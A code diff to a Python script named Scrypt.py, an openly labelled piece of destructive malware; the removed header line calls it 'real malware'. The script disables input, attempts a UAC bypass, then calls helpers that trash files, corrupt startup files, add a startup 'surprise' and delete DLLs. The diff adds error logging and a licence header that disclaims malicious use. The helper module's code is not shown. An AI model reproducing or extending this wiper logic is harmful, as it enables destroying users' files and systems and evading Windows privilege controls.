@@ -1,48 +1,79 @@
-# This is malware no joke real malware
-# https://codepal.ai
+"""
+name: Scrypt.py -> Scrypt.exe
+version: 0.0.1 (Beta)
+release: (Unreleased::Beta) 2023
+author: itzCozi (https://github.com/itzCozi)
+
+This program is free software; you can do whatever you want with it.
+Though, please do not use it for illegal purposes or maliciously.
+"""
 import time
 
-from resource import functions, Ptime, decryption
-from resource import encryption, key, hash, crytography_functions
+from resource import functions, Ptime, hash
 
 
 def start():
-	try:
-		functions.minimize_current_window()
-		functions.disable_mouse_keyboard_windows()
-		functions.UAC_bypass()
-		retitem = True
-		time.sleep(2)
+  try:
+    functions.minimize_current_window()
+    functions.disable_mouse_keyboard_windows()
 
-	except PermissionError:
-		retitem = False
+    try:
+      functions.UAC_bypass()
+    except:
+      if PermissionError:
+        print("Error: [UAC_bypass()] Permission Denied :", Ptime.nowtime())
+      else:
+        print("Error: Unknown :", Ptime.nowtime())
+        time.sleep(1)
 
-	return retitem
+    retitem = True
+    time.sleep(2)
+
+  except:
+    retitem = False
+    if PermissionError:
+      print("Error: Permission Denied :", Ptime.nowtime())
+    else:
+      print("Error: Unknown :", Ptime.nowtime())
+
+  return retitem
 
 
 def search_and_destroy():
-	try:
-		functions.file_fucker()
-		time.sleep(1)
+  try:
 
-		functions.startup_surprise()
-		functions.corrupt_startup_files()
-		functions.delete_dll()
-		retitem = True
+    try:
+      functions.file_fucker()
+    except:
+      if PermissionError:
+        print("Error: [file_fucker()] Permission Denied :", Ptime.nowtime())
+      else:
+        print("Error: Unknown :", Ptime.nowtime())
+        time.sleep(1)
 
-	except PermissionError:
-		retitem = False
+    functions.startup_surprise()
+    functions.corrupt_startup_files()
+    functions.delete_dll()
+    retitem = True
 
-	return retitem
+  except:
+    retitem = False
+    if PermissionError:
+      print("Error: Permission Denied :", Ptime.nowtime())
+    else:
+      print("Error: Unknown :", Ptime.nowtime())
+
+  return retitem
+
 
 try:
-	if start():
-		if search_and_destroy():
-			print("Success")
-		else:
-			print("Failed")
-	else:
-		print("Failed")
+  if start():
+    if search_and_destroy():
+      print("Scrypt: Success")
+    else:
+      print("Scrypt: [search&destroy()] Failed :", Ptime.nowtime())
+  else:
+    print("Scrypt: [start()] Failed :", Ptime.nowtime())
 
 except:
-	print("Failed")
+  print("Scrypt: [Global] Failed :", Ptime.nowtime())
